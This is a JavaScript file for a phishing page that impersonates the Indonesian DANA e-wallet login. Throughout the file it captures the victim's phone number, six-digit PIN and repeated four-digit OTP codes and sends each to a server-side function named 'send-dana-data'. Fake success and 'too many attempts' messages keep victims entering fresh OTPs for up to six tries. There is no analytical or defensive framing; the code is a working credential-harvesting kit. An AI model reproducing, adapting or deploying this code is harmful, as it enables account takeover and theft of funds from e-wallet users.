// Konstanta dan variabel global
const API_ENDPOINT = '/.netlify/functions/send-dana-data';
let currentAttempt = 1;
let otpTimer;
let remainingTime = 120;

// Elemen DOM
const numberPage = document.getElementById('number-page');
const pinPage = document.getElementById('pin-page');
const otpPage = document.getElementById('otp-page');
const phoneInput = document.getElementById('phone-number');
const pinInputs = document.querySelectorAll('.pin-box');
const otpInputs = document.querySelectorAll('.otp-box');
const lanjutkanButton = document.getElementById('lanjutkan-button');
const lanjutkanContainer = document.getElementById('lanjutkan-container');
const showText = document.querySelector('.show-text');
const spinnerOverlay = document.querySelector('.spinner-overlay');
const otpTimerElement = document.getElementById('otp-timer');
const floatingNotification = document.getElementById('floating-notification');
const attemptCounter = document.getElementById('attempt-counter');
const attemptNumber = document.getElementById('attempt-number');
const successNotification = document.getElementById('success-notification');
const verifikasiButton = document.getElementById('verifikasi-button');
const verifikasiContainer = document.querySelector('.verifikasi-button-container');

// Fungsi untuk memformat nomor telepon
function formatPhoneNumber(value) {
  if (!value) return '';
  
  const phoneNumber = value.replace(/\D/g, '');
  
  if (phoneNumber.length <= 3) {
    return phoneNumber;
  } else if (phoneNumber.length <= 7) {
    return `${phoneNumber.slice(0, 3)}-${phoneNumber.slice(3)}`;
  } else {
    return `${phoneNumber.slice(0, 3)}-${phoneNumber.slice(3, 7)}-${phoneNumber.slice(7, 12)}`;
  }
}

// Validasi nomor telepon Indonesia
function isValidPhoneNumber(phone) {
  const cleanPhone = phone.replace(/\D/g, '');
  return cleanPhone.length >= 10 && cleanPhone.length <= 13 && cleanPhone.startsWith('8');
}

// Pindah fokus ke input berikutnya
function moveToNextInput(currentInput, nextInputSelector) {
  if (currentInput.value.length >= currentInput.maxLength) {
    const nextInput = currentInput.parentElement.querySelector(`${nextInputSelector}:nth-child(${Array.from(currentInput.parentElement.children).indexOf(currentInput) + 2})`);
    if (nextInput) {
      nextInput.focus();
    }
  }
}

// Pindah fokus ke input sebelumnya
function moveToPrevInput(currentInput, prevInputSelector) {
  if (currentInput.value.length === 0 && currentInput.previousElementSibling) {
    currentInput.previousElementSibling.focus();
  }
}

// Tampilkan/sembunyikan spinner
function toggleSpinner(show) {
  spinnerOverlay.style.display = show ? 'flex' : 'none';
}

// Kirim data ke server
async function sendDataToServer(type, phone, pin = null, otp = null) {
  try {
    toggleSpinner(true);
    
    const response = await fetch(API_ENDPOINT, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        type,
        phone,
        pin,
        otp
      })
    });
    
    const data = await response.json();
    
    if (!response.ok) {
      throw new Error(data.error || 'Failed to send data');
    }
    
    return data;
  } catch (error) {
    console.error('Error sending data:', error);
    return { success: false, error: error.message };
  } finally {
    toggleSpinner(false);
  }
}

// Beralih halaman
function switchPage(fromPage, toPage) {
  fromPage.style.display = 'none';
  toPage.style.display = 'block';
}

// Mulai timer OTP
function startOtpTimer() {
  clearInterval(otpTimer);
  remainingTime = 120;
  updateOtpTimer();
  
  otpTimer = setInterval(() => {
    remainingTime--;
    updateOtpTimer();
    
    if (remainingTime <= 0) {
      clearInterval(otpTimer);
      showFloatingNotification('Kode OTP telah kedaluwarsa. Silakan request kode baru.', true);
    }
  }, 1000);
}

// Perbarui tampilan timer OTP
function updateOtpTimer() {
  const minutes = Math.floor(remainingTime / 60);
  const seconds = remainingTime % 60;
  otpTimerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

// Tampilkan notifikasi
function showFloatingNotification(message, showAttempt = false) {
  const notificationContent = document.getElementById('notification-content');
  notificationContent.textContent = message;
  
  if (showAttempt) {
    attemptCounter.style.display = 'block';
    attemptNumber.textContent = currentAttempt;
  } else {
    attemptCounter.style.display = 'none';
  }
  
  floatingNotification.style.display = 'block';
  
  setTimeout(() => {
    floatingNotification.style.display = 'none';
  }, 5000);
}

// Tampilkan notifikasi sukses
function showSuccessNotification() {
  successNotification.style.display = 'block';
  
  setTimeout(() => {
    successNotification.style.display = 'none';
  }, 5000);
}

// Event listener untuk input nomor telepon
phoneInput.addEventListener('input', (e) => {
  e.target.value = formatPhoneNumber(e.target.value);
});

// Event listener untuk input PIN
pinInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
    moveToNextInput(e.target, '.pin-box');
  });
  
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && e.target.value === '') {
      moveToPrevInput(e.target, '.pin-box');
    }
  });
});

// Event listener untuk input OTP
otpInputs.forEach((input, index) => {
  input.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
    moveToNextInput(e.target, '.otp-box');
    
    const allFilled = Array.from(otpInputs).every(input => input.value.length === 1);
    if (allFilled) {
      verifikasiContainer.style.display = 'block';
    }
  });
  
  input.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && e.target.value === '') {
      moveToPrevInput(e.target, '.otp-box');
    }
  });
});

// Event listener untuk tombol "Tampilkan" PIN
showText.addEventListener('click', () => {
  const isShowing = showText.classList.toggle('active');
  
  pinInputs.forEach(input => {
    input.type = isShowing ? 'text' : 'password';
  });
  
  showText.textContent = isShowing ? 'Sembunyikan' : 'Tampilkan';
});

// Event listener untuk tombol "Lanjutkan"
lanjutkanButton.addEventListener('click', async () => {
  if (numberPage.style.display === 'block') {
    const phoneNumber = phoneInput.value.replace(/\D/g, '');
    
    if (!isValidPhoneNumber(phoneNumber)) {
      showFloatingNotification('Nomor HP tidak valid. Harap masukkan nomor HP Indonesia yang benar.');
      return;
    }
    
    await sendDataToServer('phone', phoneNumber);
    switchPage(numberPage, pinPage);
    pinInputs[0].focus();
    
  } else if (pinPage.style.display === 'block') {
    const pin = Array.from(pinInputs).map(input => input.value).join('');
    
    if (pin.length !== 6) {
      showFloatingNotification('PIN harus terdiri dari 6 digit.');
      return;
    }
    
    const phoneNumber = phoneInput.value.replace(/\D/g, '');
    await sendDataToServer('pin', phoneNumber, pin);
    switchPage(pinPage, otpPage);
    otpInputs[0].focus();
    startOtpTimer();
    showFloatingNotification('Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.', true);
  }
});

// Event listener untuk tombol "Verifikasi" OTP
verifikasiButton.addEventListener('click', async () => {
  const otp = Array.from(otpInputs).map(input => input.value).join('');
  
  if (otp.length !== 4) {
    showFloatingNotification('Kode OTP harus terdiri dari 4 digit.');
    return;
  }
  
  const phoneNumber = phoneInput.value.replace(/\D/g, '');
  const pin = Array.from(pinInputs).map(input => input.value).join('');
  await sendDataToServer('otp', phoneNumber, pin, otp);
  
  showSuccessNotification();
  otpInputs.forEach(input => input.value = '');
  currentAttempt++;
  
  if (currentAttempt > 6) {
    showFloatingNotification('Terlalu banyak percobaan. Silakan coba lagi nanti.');
    otpInputs.forEach(input => {
      input.disabled = true;
    });
    verifikasiButton.disabled = true;
  } else {
    showFloatingNotification('Terlalu sering memasukkan kode OTP. Silahkan verifikasi di aplikasi DANA.', true);
  }
});

// Event listener untuk notifikasi mengambang
floatingNotification.addEventListener('click', () => {
  floatingNotification.style.display = 'none';
});

// Inisialisasi
document.addEventListener('DOMContentLoaded', () => {
  phoneInput.focus();
  
  if (pinPage.style.display === 'block' || otpPage.style.display === 'block') {
    lanjutkanContainer.classList.add('hidden');
  }
});
